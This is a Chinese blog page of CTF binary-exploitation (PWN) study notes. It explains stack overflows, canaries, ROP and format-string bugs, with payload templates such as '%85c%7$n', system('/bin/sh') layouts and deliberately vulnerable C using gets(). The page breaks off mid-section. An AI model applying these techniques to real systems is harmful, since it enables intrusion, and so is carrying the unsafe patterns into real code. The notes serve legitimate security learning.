<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>wgf4242&#39;s Blog</title>
    <meta name="generator" content="VuePress 1.5.2">
    
    <meta name="description" content="Just playing around">
    <link rel="preload" href="/text_del/assets/css/0.styles.cf9e26c4.css" as="style"><link rel="preload" href="/text_del/assets/js/app.38a0347b.js" as="script"><link rel="preload" href="/text_del/assets/js/4.6ff137c7.js" as="script"><link rel="preload" href="/text_del/assets/js/1.9204637f.js" as="script"><link rel="preload" href="/text_del/assets/js/8.ffe0ad43.js" as="script"><link rel="prefetch" href="/text_del/assets/js/10.da189038.js"><link rel="prefetch" href="/text_del/assets/js/11.3d0e03b5.js"><link rel="prefetch" href="/text_del/assets/js/12.3faa4588.js"><link rel="prefetch" href="/text_del/assets/js/13.1493b10c.js"><link rel="prefetch" href="/text_del/assets/js/14.45d45f77.js"><link rel="prefetch" href="/text_del/assets/js/15.336d299e.js"><link rel="prefetch" href="/text_del/assets/js/16.1a315ea1.js"><link rel="prefetch" href="/text_del/assets/js/17.bd22d3f9.js"><link rel="prefetch" href="/text_del/assets/js/18.2085ebc4.js"><link rel="prefetch" href="/text_del/assets/js/19.f482eb9c.js"><link rel="prefetch" href="/text_del/assets/js/2.aa1a6213.js"><link rel="prefetch" href="/text_del/assets/js/20.1424f939.js"><link rel="prefetch" href="/text_del/assets/js/21.7bab9fac.js"><link rel="prefetch" href="/text_del/assets/js/22.43336c87.js"><link rel="prefetch" href="/text_del/assets/js/23.d0c26cd8.js"><link rel="prefetch" href="/text_del/assets/js/24.1e754fff.js"><link rel="prefetch" href="/text_del/assets/js/25.62cbf33e.js"><link rel="prefetch" href="/text_del/assets/js/26.59217b9a.js"><link rel="prefetch" href="/text_del/assets/js/27.9a4d1423.js"><link rel="prefetch" href="/text_del/assets/js/28.188c8c80.js"><link rel="prefetch" href="/text_del/assets/js/29.81e7b24d.js"><link rel="prefetch" href="/text_del/assets/js/30.cc38b5af.js"><link rel="prefetch" href="/text_del/assets/js/31.eff58e26.js"><link rel="prefetch" href="/text_del/assets/js/32.e01b5910.js"><link rel="prefetch" href="/text_del/assets/js/33.2ee58a43.js"><link rel="prefetch" href="/text_del/assets/js/34.60f9b232.js"><link rel="prefetch" href="/text_del/assets/js/35.871b4689.js"><link rel="prefetch" href="/text_del/assets/js/36.eb73ffb8.js"><link rel="prefetch" href="/text_del/assets/js/37.4ccb1d44.js"><link rel="prefetch" href="/text_del/assets/js/38.c8931134.js"><link rel="prefetch" href="/text_del/assets/js/39.0f94f3b9.js"><link rel="prefetch" href="/text_del/assets/js/40.0ff7aa51.js"><link rel="prefetch" href="/text_del/assets/js/41.81cb0efa.js"><link rel="prefetch" href="/text_del/assets/js/42.5308667f.js"><link rel="prefetch" href="/text_del/assets/js/43.6ec5211e.js"><link rel="prefetch" href="/text_del/assets/js/44.547663ab.js"><link rel="prefetch" href="/text_del/assets/js/45.86cc5dff.js"><link rel="prefetch" href="/text_del/assets/js/46.478f9d7a.js"><link rel="prefetch" href="/text_del/assets/js/47.59654d64.js"><link rel="prefetch" href="/text_del/assets/js/48.e4fc9beb.js"><link rel="prefetch" href="/text_del/assets/js/49.24429e93.js"><link rel="prefetch" href="/text_del/assets/js/5.18a871e9.js"><link rel="prefetch" href="/text_del/assets/js/50.6c537fc7.js"><link rel="prefetch" href="/text_del/assets/js/51.faef1963.js"><link rel="prefetch" href="/text_del/assets/js/52.c13641a3.js"><link rel="prefetch" href="/text_del/assets/js/53.464b5616.js"><link rel="prefetch" href="/text_del/assets/js/54.e7c1ed12.js"><link rel="prefetch" href="/text_del/assets/js/55.493db0fd.js"><link rel="prefetch" href="/text_del/assets/js/56.8a03de0f.js"><link rel="prefetch" href="/text_del/assets/js/57.f1b9e010.js"><link rel="prefetch" href="/text_del/assets/js/6.71aa5eb7.js"><link rel="prefetch" href="/text_del/assets/js/7.e82d5ddf.js"><link rel="prefetch" href="/text_del/assets/js/9.e9439c4b.js">
    <link rel="stylesheet" href="/text_del/assets/css/0.styles.cf9e26c4.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container" data-v-19557b78><div data-v-19557b78><div id="loader-wrapper" class="loading-wrapper" data-v-d48f4d20 data-v-19557b78 data-v-19557b78><div class="loader-main" data-v-d48f4d20><div data-v-d48f4d20></div><div data-v-d48f4d20></div><div data-v-d48f4d20></div><div data-v-d48f4d20></div></div> <!----> <!----></div> <div class="password-shadow password-wrapper-out" style="display:none;" data-v-64685f0e data-v-19557b78 data-v-19557b78><h3 class="title" style="display:none;" data-v-64685f0e data-v-64685f0e>wgf4242's Blog</h3> <!----> <label id="box" class="inputBox" style="display:none;" data-v-64685f0e data-v-64685f0e><input type="password" value="" data-v-64685f0e> <span data-v-64685f0e>Konck! Knock!</span> <button data-v-64685f0e>OK</button></label> <div class="footer" style="display:none;" data-v-64685f0e data-v-64685f0e><span data-v-64685f0e><i class="iconfont reco-theme" data-v-64685f0e></i> <a target="blank" href="https://vuepress-theme-reco.recoluan.com" data-v-64685f0e>vuePress-theme-reco</a></span> <span data-v-64685f0e><i class="iconfont reco-copyright" data-v-64685f0e></i> <a data-v-64685f0e><span data-v-64685f0e>wgf4242's Blog</span>
            
          <!---->
          2020
        </a></span></div></div> <div class="hide" data-v-19557b78><header class="navbar" data-v-19557b78><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/text_del/" class="home-link router-link-active"><!----> <span class="site-name">wgf4242's Blog</span></a> <div class="links"><div class="color-picker"><a class="color-button"><i class="iconfont reco-color"></i></a> <div class="color-picker-menu" style="display:none;"><div class="mode-options"><h4 class="title">Choose mode</h4> <ul class="color-mode-options"><li class="dark">dark</li><li class="auto active">auto</li><li class="light">light</li></ul></div></div></div> <div class="search-box"><i class="iconfont reco-search"></i> <input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/text_del/home/" class="nav-link"><i class="iconfont undefined"></i>
  主页
</a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title"><i class="iconfont undefined"></i>
      文章
    </span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/text_del/article/technology/" class="nav-link"><i class="iconfont undefined"></i>
  技术
</a></li><li class="dropdown-item"><!----> <a href="/text_del/article/essay/" class="nav-link"><i class="iconfont undefined"></i>
  随笔
</a></li><li class="dropdown-item"><!----> <a href="/text_del/article/other/" class="nav-link"><i class="iconfont undefined"></i>
  其他
</a></li></ul></div></div><div class="nav-item"><a href="/text_del/about/" class="nav-link"><i class="iconfont undefined"></i>
  关于
</a></div><div class="nav-item"><a href="https://www.github.com/wgf4242" target="_blank" rel="noopener noreferrer" class="nav-link external"><i class="iconfont undefined"></i>
  Github
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav></div></header> <div class="sidebar-mask" data-v-19557b78></div> <aside class="sidebar" data-v-19557b78><div class="personal-info-wrapper" data-v-042e23d4><!----> <h3 class="name" data-v-042e23d4>
    wgf4242's Blog
  </h3> <div class="num" data-v-042e23d4><div data-v-042e23d4><h3 data-v-042e23d4>0</h3> <h6 data-v-042e23d4>Article</h6></div> <div data-v-042e23d4><h3 data-v-042e23d4>0</h3> <h6 data-v-042e23d4>Tag</h6></div></div> <hr data-v-042e23d4></div> <nav class="nav-links"><div class="nav-item"><a href="/text_del/home/" class="nav-link"><i class="iconfont undefined"></i>
  主页
</a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title"><i class="iconfont undefined"></i>
      文章
    </span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/text_del/article/technology/" class="nav-link"><i class="iconfont undefined"></i>
  技术
</a></li><li class="dropdown-item"><!----> <a href="/text_del/article/essay/" class="nav-link"><i class="iconfont undefined"></i>
  随笔
</a></li><li class="dropdown-item"><!----> <a href="/text_del/article/other/" class="nav-link"><i class="iconfont undefined"></i>
  其他
</a></li></ul></div></div><div class="nav-item"><a href="/text_del/about/" class="nav-link"><i class="iconfont undefined"></i>
  关于
</a></div><div class="nav-item"><a href="https://www.github.com/wgf4242" target="_blank" rel="noopener noreferrer" class="nav-link external"><i class="iconfont undefined"></i>
  Github
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span></span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/text_del/ctf/2019-03-26-PWN.html#tips" class="sidebar-link">Tips</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/text_del/ctf/2019-03-26-PWN.html#配置环境" class="sidebar-link">配置环境</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/text_del/ctf/2019-03-26-PWN.html#准备工具" class="sidebar-link">准备工具</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/text_del/ctf/2019-03-26-PWN.html#解题思路" class="sidebar-link">解题思路</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/text_del/ctf/2019-03-26-PWN.html#学习路径" class="sidebar-link">学习路径</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/2019-03-26-PWN.html#常见漏洞" class="sidebar-link">常见漏洞</a></li></ul></li><li><a href="/text_del/ctf/2019-03-26-PWN.html#基础学习" class="sidebar-link">基础学习</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/text_del/ctf/2019-03-26-PWN.html#编译与执行" class="sidebar-link">编译与执行</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/2019-03-26-PWN.html#fmt" class="sidebar-link">fmt</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/2019-03-26-PWN.html#rop-gadget" class="sidebar-link">ROP Gadget</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/2019-03-26-PWN.html#stack-migration" class="sidebar-link">stack migration</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/2019-03-26-PWN.html#uaf原理" class="sidebar-link">UAF原理</a></li></ul></li><li><a href="/text_del/ctf/2019-03-26-PWN.html#常用命令" class="sidebar-link">常用命令</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/text_del/ctf/2019-03-26-PWN.html#pwntools" class="sidebar-link">pwntools</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/text_del/ctf/2019-03-26-PWN.html#本地启动" class="sidebar-link">本地启动</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/2019-03-26-PWN.html#怎样调试" class="sidebar-link">怎样调试</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/2019-03-26-PWN.html#指令介绍" class="sidebar-link">指令介绍</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/2019-03-26-PWN.html#示例" class="sidebar-link">示例</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/2019-03-26-PWN.html#相关知识" class="sidebar-link">相关知识</a></li></ul></li><li><a href="/text_del/ctf/2019-03-26-PWN.html#one-gadget" class="sidebar-link">one_gadget</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/text_del/ctf/2019-03-26-PWN.html#radare2使用" class="sidebar-link">radare2使用</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/text_del/ctf/2019-03-26-PWN.html#练习" class="sidebar-link">练习</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/text_del/ctf/2019-03-26-PWN.html#wiki" class="sidebar-link">Wiki</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/text_del/ctf/2019-03-26-PWN.html#checksec-、-二进制保护机制" class="sidebar-link">checksec 、 二进制保护机制</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/2019-03-26-PWN.html#栈" class="sidebar-link">栈</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/2019-03-26-PWN.html#c代码翻译" class="sidebar-link">C代码翻译</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/2019-03-26-PWN.html#c语言各数据类型大小和取值范围" class="sidebar-link">C语言各数据类型大小和取值范围</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/2019-03-26-PWN.html#printf" class="sidebar-link">printf</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/2019-03-26-PWN.html#plt-glt" class="sidebar-link">PLT &amp; GLT</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/2019-03-26-PWN.html#常用函数" class="sidebar-link">常用函数</a></li></ul></li></ul></section></li></ul> </aside> <div class="password-shadow password-wrapper-in" style="display:none;" data-v-64685f0e data-v-19557b78><h3 class="title" style="display:none;" data-v-64685f0e data-v-64685f0e></h3> <!----> <label id="box" class="inputBox" style="display:none;" data-v-64685f0e data-v-64685f0e><input type="password" value="" data-v-64685f0e> <span data-v-64685f0e>Konck! Knock!</span> <button data-v-64685f0e>OK</button></label> <div class="footer" style="display:none;" data-v-64685f0e data-v-64685f0e><span data-v-64685f0e><i class="iconfont reco-theme" data-v-64685f0e></i> <a target="blank" href="https://vuepress-theme-reco.recoluan.com" data-v-64685f0e>vuePress-theme-reco</a></span> <span data-v-64685f0e><i class="iconfont reco-copyright" data-v-64685f0e></i> <a data-v-64685f0e><span data-v-64685f0e>wgf4242's Blog</span>
            
          <!---->
          2020
        </a></span></div></div> <div data-v-19557b78><main class="page"><div class="page-title" style="display:none;"><h1></h1> <hr> <div data-v-34ea29db><i class="iconfont reco-account" data-v-34ea29db><span data-v-34ea29db>wgf4242's Blog</span></i> <!----> <!----> <!----></div></div> <div class="theme-reco-content content__default" style="display:none;"><p>[TOC]</p> <h1 id="pwn"><a href="#pwn" class="header-anchor">#</a> PWN</h1> <p>wiki</p> <p>exo = exploit 漏洞</p> <h2 id="tips"><a href="#tips" class="header-anchor">#</a> Tips</h2> <p><a href="https://blog.csdn.net/weixin_43868725/article/details/105962349#comments_12355290" target="_blank" rel="noopener noreferrer">scanf不接受非法字符<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>
, 不能 p64(secret0_addr)+'%77c%8$n'。但是发现上一次输入的值100=0x64的偏移量为7。所以secret0_addr输入，构造payload='%85c%7$n'，这样就可以向secret0_addr中写入85了，从而通过验证。</p> <h2 id="配置环境"><a href="#配置环境" class="header-anchor">#</a> 配置环境</h2> <p>PIP使用国内源</p> <div class="language- extra-class"><pre><code>mkdir ~/.pip/pip.conf
vi ~/.pip/pip.conf

复制一下，使用Shift+Insert粘贴内容如下：
[global]
index-url = https://pypi.tuna.tsinghua.edu.cn/simple
[install]
trusted-host=mirrors.aliyun.com
</code></pre></div><p>最后按esc, wq!回车保存</p> <h2 id="准备工具"><a href="#准备工具" class="header-anchor">#</a> 准备工具</h2> <p>Linux 下</p> <p>sudo pip3 install pwntools</p> <div class="language- extra-class"><pre><code>如果没有pip就先 sudo apt install python-pip
</code></pre></div><h2 id="解题思路"><a href="#解题思路" class="header-anchor">#</a> 解题思路</h2> <p>checksec 查看保护机制，no Stack-canary可以用shellcode。根据不同的保护机制来进行构造不同的payload</p> <div class="language- extra-class"><pre><code>如果安装了gdb peda, 进入gdb后 checksec filename
</code></pre></div><p>在linux 32位的程序中，传递参数问题</p> <div class="language- extra-class"><pre><code>传递参数值将参数放入栈中的，当传递的是字符串时表示将这个字符串的地址放入栈中。
当将一个函数的返回覆盖成另一个函数的地址时需要将这个地址的上面一个位置当成这个函数的返回地址，再上面还有这个函数的参数，当有三个参数时eg：a,b,c这三个参数的入栈次序为c,b,a，即a在最下方
可以使用pwntools里面自带的功能来构造shellcode。eg：shellcode=asm(shellcraft.sh())
在栈中存储数字时需要使用p32或者p64进行转换eg：0x123456在栈中从高地址向低地址的存储为56,34,12，因为这是16进制的因此两个一组，当存储字符串时：eg：‘admin’在栈中从高地址向低地址的存储为n,i,m,d,a。
使用ELF加载程序和process,remote加载程序是不同的，ELF是静态加载的，后面两种是动态的。
</code></pre></div><p>简单溢出思路:</p> <ol><li>拖进ida, Shift+F12, Ctrl+F 搜flag</li> <li>有bin/sh,找溢出点通过system运行bin/sh的地址</li> <li>字符串格式化漏洞, 打印多个<code>.%x</code>来计算栈参数位置, 通过溢出或 %85c%7$n 给栈中第7个参数赋值来修改。</li></ol> <h3 id="学习路径"><a href="#学习路径" class="header-anchor">#</a> 学习路径</h3> <p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/#ret2libc" target="_blank" rel="noopener noreferrer">路径<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <ol><li>基本ROP</li></ol> <p><a href="https://writeup.ctfhub.com/Skill/Pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/eeca3548.html" target="_blank" rel="noopener noreferrer">ret2text<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> <a href="http://uuzdaisuki.com/2020/02/22/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2text/" target="_blank" rel="noopener noreferrer">原理<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>ret2shellcode</p> <p>ret2syscall</p> <p>ret2libc</p> <ol start="2"><li>中级ROP</li></ol> <p>ret2csu</p> <p>ret2reg</p> <p>BROP</p> <ol start="3"><li>高级 ROP</li></ol> <p>ret2_dl_runtime_resolve</p> <p>SROP</p> <p>ret2VDSO</p> <h3 id="常见漏洞"><a href="#常见漏洞" class="header-anchor">#</a> 常见漏洞</h3> <ol><li><p>fgets(&amp;s, 32, edata); 限制了32位长度</p></li> <li><p>字符串溢出: 无栈保护, 没有字符长度检查时</p></li> <li><p>字符串格式化漏洞: 用户输入字符，未检查长度，溢出覆盖返回地址。</p></li> <li><p>整数溢出 int_overflow: 无符号数字 0-255, 超出识别为255内,259识别3。来过些判断</p></li> <li><p>read溢出 返回main, 配合libc读取bin/sh，练习：xman_level3</p></li> <li><p>ROP</p></li> <li><p>glibc heap的一些利用.</p></li> <li><p>IO_FILE结构的利用.</p></li></ol> <p><a href="#_6">内存泄漏</a></p> <p>偏向实战:</p> <div class="language- extra-class"><pre><code>webserver
虚拟机逆向…
内核提权..ctf中常常是写的驱动的问题.
魔改的JS引擎.
等等等.
</code></pre></div><h2 id="基础学习"><a href="#基础学习" class="header-anchor">#</a> 基础学习</h2> <p><a href="https://www.csdn.net/gather_2a/MtTacg4sMDg1NS1ibG9n.html" target="_blank" rel="noopener noreferrer">参考<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>比如有个函数vulnerable_function() 中执行一个读取操作时</p> <table><thead><tr><th>执行过程</th></tr></thead> <tbody><tr><td>可读取空间</td></tr> <tr><td>可读取空间</td></tr> <tr><td>可读取空间</td></tr> <tr><td>…………</td></tr> <tr><td>s - string</td></tr> <tr><td>r - return 返回地址</td></tr></tbody></table> <p><img src="/text_del/assets/img/pwn01.dd73c4b6.png" alt="Alt text"></p> <p><img src="/text_del/assets/img/pwn02.154cb0d8.png" alt="Alt text"></p> <p>system函数执行:</p> <div class="language- extra-class"><pre><code>system_address + &quot;return地址,随意填可为0x1&quot; + bin_sh_addr
system地址|假返回地址|执行参数(示例为bin/sh的地址)
</code></pre></div><p>shellcode填写函数时，需要加返回地址:</p> <div class="language- extra-class"><pre><code>0x88*'a'+p32(0xdeadbeef) + 函数地址 + 函数返回地址 + 参数1 + 参数2 + 参数3 ...
</code></pre></div><p>Ubuntu18运行机制与前面版本的不同，在调用system的时候需要进行栈对齐</p> <p><a href="http://blog.eonew.cn/archives/958" target="_blank" rel="noopener noreferrer">栈未对齐引发Crash<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p><a href="https://www.cnblogs.com/Rookle/p/12871878.html" target="_blank" rel="noopener noreferrer">栈未对齐引发Crash1<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p><strong>基本输入输出FD</strong></p> <p>fd的类型为int，值为0、1、2,分别代表标准输入、标准输出、标准错误输出。</p> <h3 id="编译与执行"><a href="#编译与执行" class="header-anchor">#</a> 编译与执行</h3> <h4 id="关闭-canary-保护机制"><a href="#关闭-canary-保护机制" class="header-anchor">#</a> 关闭 canary 保护机制</h4> <div class="language- extra-class"><pre><code>gcc test.c -fno-statckprotector -o test
</code></pre></div><div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"># <span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
    <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Input</span>
    <span class="token function">puts</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//0utput</span>
<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><table><thead><tr><th>stack</th> <th>description</th></tr></thead> <tbody><tr><td>...</td> <td>low address</td></tr> <tr><td>buffer</td> <td></td></tr> <tr><td>...</td> <td></td></tr> <tr><td>saved rbp</td> <td></td></tr> <tr><td>return address</td> <td></td></tr> <tr><td>...</td> <td>high address</td></tr></tbody></table> <hr> <p>输入一长串a后</p> <table><thead><tr><th>comment</th> <th>stack</th> <th>description</th></tr></thead> <tbody><tr><td>...</td> <td>low address</td> <td></td></tr> <tr><td>buffer</td> <td>aaaaaaaa</td> <td>.</td></tr> <tr><td>.</td> <td>aaaaaaaa</td> <td>.</td></tr> <tr><td>.</td> <td>aaaaaaaa</td> <td>.</td></tr> <tr><td>.return address被输入盖掉了</td> <td>aaaaaaaa</td> <td></td></tr> <tr><td>.</td> <td>aaaaaaaa</td> <td>high address</td></tr></tbody></table> <h4 id="gets-read"><a href="#gets-read" class="header-anchor">#</a> gets &amp; read</h4> <ul><li>gets
<ul><li>没有限制输入长度</li></ul></li> <li>read
<ul><li>有限制最大输入长度</li> <li>可overflow大小为最大输入长度与buffer长度之间</li></ul></li></ul> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"># <span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
    <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//最大只能 overflow 8 bytes</span>
    <span class="token comment">// 最大长度16 - buffer 长度(8) = 8</span>
    <span class="token function">puts</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p><img src="/text_del/assets/img/pwn_stack02.4f741aff.jpg" alt=""></p> <h4 id="stack-canary"><a href="#stack-canary" class="header-anchor">#</a> Stack Canary</h4> <ul><li><p>在rbp之前塞一個random值，ret之前查是否相同，不同的话就 abort</p></li> <li><p>有canary的括不能盖到return address rbp</p></li></ul> <div class="language- line-numbers-mode"><pre class="language-text"><code>% ./test
aaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaa
*** stack smashing detected ***; &lt;unkonw&gt; terminateed
zsh:abort (core dumped) ./test
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p><img src="/text_del/assets/img/pwn_stack03.26f8fc28.jpg" alt=""></p> <h4 id="bof应用-buffer-overflow"><a href="#bof应用-buffer-overflow" class="header-anchor">#</a> bof应用 (buffer overflow)</h4> <ul><li>先看看stack上有什么
